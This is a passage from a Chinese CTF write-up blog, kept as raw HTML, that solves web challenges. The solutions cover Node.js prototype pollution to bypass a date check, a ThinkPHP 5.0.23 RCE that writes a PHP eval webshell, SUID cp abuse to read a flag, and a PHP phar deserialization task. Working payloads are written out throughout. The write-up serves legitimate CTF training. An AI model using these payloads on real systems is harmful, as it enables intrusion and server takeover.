punctuation\">(</span>d<span class=\"token punctuation\">.</span><span class=\"token function\">getTime</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">return</span> d<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">else</span> <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>从如下代码片段可知，基于 format 的日期匹配依赖于 baseDate，format 的过程是在 argTable 上进行覆盖</p>\n<figure class=\"highlight javascript\"><figcaption data-lang=\"javascript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">const</span> dateObj <span class=\"token operator\">=</span> opts<span class=\"token punctuation\">.</span>baseDate</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">const</span> _UTC <span class=\"token operator\">=</span> opts<span class=\"token punctuation\">.</span><span class=\"token constant\">UTC</span> <span class=\"token operator\">?</span> <span class=\"token string\">\"UTC\"</span> <span class=\"token operator\">:</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">let</span> argTable <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token string-property property\">\"yyyy\"</span><span class=\"token operator\">:</span> dateObj<span class=\"token punctuation\">[</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">get</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>_UTC<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">FullYear</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token string-property property\">\"MM\"</span><span class=\"token operator\">:</span> dateObj<span class=\"token punctuation\">[</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">get</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>_UTC<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">Month</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token string-property property\">\"dd\"</span><span class=\"token operator\">:</span> dateObj<span class=\"token punctuation\">[</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">get</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>_UTC<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">Date</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token string-property property\">\"HH\"</span><span class=\"token operator\">:</span> dateObj<span class=\"token punctuation\">[</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">get</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>_UTC<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">Hours</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token string-property property\">\"mm\"</span><span class=\"token operator\">:</span> dateObj<span class=\"token punctuation\">[</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">get</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>_UTC<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">Minutes</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token string-property property\">\"ss\"</span><span class=\"token operator\">:</span> dateObj<span class=\"token punctuation\">[</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">get</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>_UTC<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">Seconds</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token string-property property\">\"fff\"</span><span class=\"token operator\">:</span> dateObj<span class=\"token punctuation\">[</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">get</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>_UTC<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">Milliseconds</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">]</span> <span class=\"token operator\">?</span> dateObj<span class=\"token punctuation\">[</span><span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">get</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>_UTC<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">Milliseconds</span><span class=\"token template-punctuation string\">`</span></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token keyword\">undefined</span> <span class=\"token comment\">// due to system architecture</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sortTable<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">f<span class=\"token punctuation\">,</span> i</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>f <span class=\"token operator\">==</span> <span class=\"token string\">\"yy\"</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">let</span> year <span class=\"token operator\">=</span> <span class=\"token function\">Number</span><span class=\"token punctuation\">(</span>regres<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        year <span class=\"token operator\">=</span> year <span class=\"token operator\">&lt;</span> <span class=\"token number\">100</span> <span class=\"token operator\">?</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1900</span> <span class=\"token operator\">+</span> year<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> year<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">return</span> argTable<span class=\"token punctuation\">[</span><span class=\"token string\">\"yyyy\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> year<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    argTable<span class=\"token punctuation\">[</span>f<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">Number</span><span class=\"token punctuation\">(</span>regres<span class=\"token punctuation\">[</span>i <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>因此污染 <code>baseDate</code>  为无效日期即可绕过 format 模式进入 Fallback Auto Detection</p>\n<p><code>routes/info.js</code>  的 <code>try</code>  中用的是 <code>config.js</code>  中的 <code>min_pulic_time</code> ，为 <code>2019-07-09 00:00:00</code> ，不带有毫秒，刚好能够触发 <code>fff</code>  的原型链污染，为 <code>fff</code>  指定为无效值即可</p>\n<p>到此为止，使用如下的 payload 可以触发 <code>catch</code></p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token string-property property\">\"contact\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">,</span> <span class=\"token string-property property\">\"reason\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token string-property property\">\"constructor\"</span><span class=\"token operator\">:</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token string-property property\">\"prototype\"</span><span class=\"token operator\">:</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token string-property property\">\"baseDate\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"aaa\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token string-property property\">\"fff\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"bbb\"</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>进入 <code>catch</code>  后，达到了污染 <code>format</code>  的条件，但是 <code>createDate</code>  的参数变成了 <code>config.default.js</code>  中的 <code>min_public_time</code> ，为 <code>2019-07-08T16:00:00.000Z</code> ，因此可以构造 <code>format</code>  为 <code>yy19-MM-ddTHH:mm:ss.fffZ</code></p>\n<p>然后基于 <code>format</code>  的日期匹配会返回 <code>1920-07-08T16:00:00.000Z</code>  的日期，已经将 <code>minTimestamp</code>  提早了近一个世纪了</p>\n<p>因此最终的 <code>payload</code>  为</p>\n<figure class=\"highlight js\"><figcaption data-lang=\"JavaScript\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token string-property property\">\"contact\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span> <span class=\"token string-property property\">\"reason\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"a\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token string-property property\">\"constructor\"</span><span class=\"token operator\">:</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token string-property property\">\"prototype\"</span><span class=\"token operator\">:</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>      <span class=\"token string-property property\">\"format\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"yy19-MM-ddTHH:mm:ss.fffZ\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      <span class=\"token string-property property\">\"baseDate\"</span><span class=\"token operator\">:</span><span class=\"token string\">\"aaa\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      <span class=\"token string-property property\">\"fff\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"bbb\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>然后为我们再请求 <code>/info/0</code> ，找到含有 flag 的一条数据</p>\n<figure class=\"highlight json\"><figcaption data-lang=\"JSON\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token property\">\"wishid\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2SZMVuFT4q6kCDjsCC3fXnmW\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token property\">\"date\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"2021-09-27\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token property\">\"place\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"学園都市\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token property\">\"contact\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"御坂美琴\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token property\">\"reason\"</span><span class=\"token operator\">:</span> <span class=\"token string\">\"海胆のような顔をしたあいつが大覇星祭で私に負けた、彼を連れて出かけるつもりだ。彼を携帯店のカップルのイベントに連れて行きたい（イベントでプレゼントされるゲコ太は超レアだ！）晴れの日が必要で、彼を完全にやっつける！ゲコ太の抽選番号はflag&#123;63834b07-2417-4e14-b558-96d8511fe3ac&#125;です\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token property\">\"timestamp\"</span><span class=\"token operator\">:</span> <span class=\"token number\">1190726040622</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>得到 flag</p>\n<h2 id=\"week5\"><a class=\"anchor\" href=\"#week5\">#</a> Week5</h2>\n<h3 id=\"final\"><a class=\"anchor\" href=\"#final\">#</a> Final</h3>\n<p>通过信息收集确定 ThinkPHP 版本为 5.0.23，可以查找到 ThinkPHP 5.0.23 存在 RCE 漏洞，找到现成的 Exp：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0x1Y2t5MXlvdXppL2FydGljbGUvZGV0YWlscy8xMjg3NDA1NTI/YWNjZXNzVG9rZW49ZXlKaGJHY2lPaUpJVXpJMU5pSXNJbXRwWkNJNkltUmxabUYxYkhRaUxDSjBlWEFpT2lKS1YxUWlmUS5leUpsZUhBaU9qRTNNRE0xTURVNE9Ea3NJbVpwYkdWSFZVbEVJam9pVWpOelIyZGFaSEpzZVVVMmJrdzRWQ0lzSW1saGRDSTZNVGN3TXpVd05UVTRPU3dpYVhOeklqb2lkWEJzYjJGa1pYSmZZV05qWlhOelgzSmxjMjkxY21ObElpd2lkWE5sY2tsa0lqb3RPRFE1TURZeE5qRXpObjAuaVR6eE9mcXJpdmdsTmtpV1FNMDZaclJjdEZWeDFjU3poc3VEQ3BaeUQ3TQ==\">https://blog.csdn.net/Lucky1youzi/article/details/128740552</span></p>\n<p>/index.php?s=captcha</p>\n<p>POST: _method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=5</p>\n<p>可以知道 system 被禁用：</p>\n<p>但是还可以用 passthru 来执行命令，写入 WebShell：</p>\n<p>/index.php?s=captcha</p>\n<p>POST: _method=__construct&amp;filter[]=passthru&amp;method=get&amp;server[REQUEST_METHOD]=echo%20'&lt;?php%20eval($_POST['cmd']);?&gt;'%20&gt;%20/var/www/public/2.php</p>\n<p>反弹 shell 成功，然后发现没有权限读文件，查看具有 SUID 权限的命令：</p>\n<blockquote>\n<p>find / -user root -perm -4000 -print 2&gt;/dev/null<br />\n/bin/cp<br />\n/bin/mount<br />\n/bin/su<br />\n/bin/umount</p>\n</blockquote>\n<blockquote abc80326-d717-4013-b22c-1d705360a6b3=\"\">\n<p>cp ./flag_dd3f6380aa0d /etc/passwd<br />\ncat /etc/passwd<br />\nflag</p>\n</blockquote>\n<h3 id=\"unserialize-again\"><a class=\"anchor\" href=\"#unserialize-again\">#</a> Unserialize Again</h3>\n<p>进入界面是个上传界面，随便上传一个文件后发现提示：这次不是在这里上传。</p>\n<p>打开开发者工具在响应包中看到：pairing.php</p>\n<p>访问：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">story</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$user</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$pass</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$eating</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$God</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'false'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">user</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'human'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token operator\">!=</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$fffflag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">user</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'AshenOne'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">eating</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'fire'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__tostring</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">user</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">pass</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">user</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">pass</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$nothing</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">God</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'true'</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">user</span><span class=\"token operator\">==</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">eating</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Get Out!'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">&#125;</span>                 </pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pear'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'apple'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token comment\">// $Eden=new story();</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token variable\">$pear</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pear'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    <span class=\"token variable\">$Adam</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'apple'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'php://input'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pear</span><span class=\"token punctuation\">,</span><span class=\"token function\">urldecode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$Adam</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'多吃雪梨'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token punctuation\">&#125;</span> 多吃雪梨</span></pre></td></tr></table></figure><p>通过 file_exists 函数可以知道本题的考点是 phar 反序列化，当然还有个非预期解就是直接写马，这里就不演示了。</p>\n<p>至于如何写入文件则是通过  file_put_contents (<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>p</mi><mi>e</mi><mi>a</mi><mi>r</mi><mo separator=\"true\">,</mo><mi>u</mi><mi>r</mi><mi>l</mi><mi>d</mi><mi>e</mi><mi>c</mi><mi>o</mi><mi>d</mi><mi>e</mi><mo stretchy=\"false\">(</mo></mrow><annotation encoding=\"application/x-tex\">pear,urldecode(</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">p</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">a</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord mathnormal\">u</span><span class=\"mord mathnormal\" style=\"margin-right:0.02778em;\">r</span><span class=\"mord mathnormal\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">c</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord mathnormal\">e</span><span class=\"mopen\">(</span></span></span></span>file));</p>\n<p>其中 $pear 则是文件名，而 post 内容则是文件内容。</p>\n<p>首先生成 phar.phar 文件：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td 